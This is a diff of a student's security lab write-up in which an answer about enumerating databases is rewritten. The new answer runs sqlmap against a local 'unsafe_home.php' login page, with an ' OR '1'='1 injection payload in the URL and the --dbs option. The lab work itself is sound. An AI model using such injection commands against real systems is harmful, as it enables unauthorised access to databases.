@@ -32,12 +32,10 @@ The 0x41 values (which are ASCII 'A') represent the overflowed buffer. You have 
 
 **Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**:
-First, i open my web browser and go to the login page:
-> http://localhost:3128
-![alt text](image-7.png)
+first i open the command prompt and cd to the extracted folder.
+![alt text](image-11.png)
+then i run sqlmap to Retrieve Databases:
+> `python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=admin&Password=anything' OR '1'='1" --dbs`
 
-Then, 
-1. Right-click on the page and select Inspect (or press F12) to open the Developer Tools.
-2. Navigate to the Elements tab to view the HTML structure of the page.
-![alt text](image-8.png)
-3. Look for the `<form>` tag that contains the username and password fields. This will help you understand how the login request is being processed.
+![alt text](image-12.png)
+
